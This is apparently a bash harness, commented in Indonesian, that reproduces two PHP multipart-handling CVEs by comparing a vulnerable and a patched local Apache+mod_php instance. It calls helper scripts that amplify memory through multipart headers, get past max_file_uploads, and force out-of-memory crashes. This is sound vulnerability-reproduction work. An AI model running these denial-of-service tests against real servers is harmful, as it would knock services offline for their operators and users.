#!/usr/bin/env bash
# Reproduksi diferensial CVE-2026-109618 / CVE-2026-109619
#   :8091 = Apache + mod_php 8.4.11  (vulnerable)
#   :8092 = Apache + mod_php 8.4.27  (patched)
#
# Jalankan:  ./apache_diff.sh start && ./run_diff.sh
set -u
cd "$(dirname "${BASH_SOURCE[0]}")"

echo "############ 1. versi PHP per instance ############"
for p in 8091 8092; do
  tag=$([ "$p" = 8091 ] && echo "vulnerable" || echo "patched ")
  printf "  :%s [%s] %s\n" "$p" "$tag" "$(curl -s http://127.0.0.1:$p/info.php | tr '\n' ' ')"
done

echo
echo "############ 2. amplifikasi memori header part multipart ############"
python3 mem_measure.py headers 25000,50000,100000,200000

echo
echo "############ 3. file control kosong (bypass max_file_uploads) ############"
python3 mem_measure.py emptyfile 1000,2000,4000,6000

echo
echo "############ 4. OOM saat request startup (vektor utama CVE-2026-109618) ############"
python3 oom_test.py --strategy headers -n 200000

echo
echo "############ 5. OOM saat runtime (perilaku bailout) ############"
for p in 8091 8092; do
  tag=$([ "$p" = 8091 ] && echo "vulnerable" || echo "patched ")
  printf "  :%s [%s] " "$p" "$tag"
  curl -s -o /dev/null -w "http=%{http_code}\n" http://127.0.0.1:$p/oom.php
done

echo
echo "############ 6. ringkasan log error ############"
for d in vuln fixed; do
  echo "--- $d ---"
  grep -E "Allowed memory size|exit signal|Segmentation" "run/$d/httpd.conf.error.log" | tail -4
done
